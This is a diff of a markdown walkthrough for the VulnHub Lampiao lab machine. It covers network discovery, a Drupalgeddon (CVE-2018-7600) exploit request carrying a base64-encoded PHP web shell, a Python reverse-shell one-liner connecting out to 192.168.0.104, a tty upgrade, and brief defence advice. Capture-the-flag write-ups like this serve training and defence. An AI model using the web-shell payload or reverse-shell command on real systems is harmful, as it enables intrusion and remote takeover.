@@ -2,13 +2,13 @@
 
 Discover the IP using arp-scan <br>
 ```
-arp-scan -l -I en1 -v
+$ arp-scan -l -I en1 -v
 Interface: en1, datalink type: EN10MB (Ethernet)
 Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
 192.168.0.105	08:00:27:e5:04:1a	CADMUS COMPUTER SYSTEMS
 ```
 
-Check the services/ports exposed
+Check the services/ports exposed using nmap
 
 ```
 PORT     STATE SERVICE REASON  VERSION
@@ -44,13 +44,13 @@ From [CVE-2018-7600-Drupal-RCE](https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
 [v] HTTP - URL : http://192.168.0.105:1898/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee lampioaa.php
 ```
 
-Luckily the exploit which we ran, automatically creates a shell and prompts us with a jailed shell with a lot of restrictions.
+Luckily the exploit which we ran, automatically creates a shell and prompts us with a jailed environment with a lot of restrictions.
 
 We can get a reverse shell using Python with ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.104",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` 
 
 Reverse shells generally don't have tty enabled and we need to upgrade our shell so that we can run commands like `sudo` `su` `ssh`
 
-```python -c 'import pty; pty.spawn("/bin/sh")'```
+To enable tty on a jailed shell, we can run, ```python -c 'import pty; pty.spawn("/bin/sh")'```
 
 <p align="center">
   <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/tty-no-tty.png">
@@ -88,5 +88,10 @@ We can ssh as the root user with the modified password.
 ## Defense 
 
 1) Firewall/IDS/IPS rule to detect signature of druppalgeddon and block it. 
-2) Disable access to sensitive files like robots.txt, CHANGELOG.txt and so on. 
+2) Disable access to sensitive files like CHANGELOG.txt.
 3) Limit the ACL for uploading, executing files in the OS level or Server level. 
+
+## References 
+
+1) https://netsec.ws/?p=337
+2) https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell
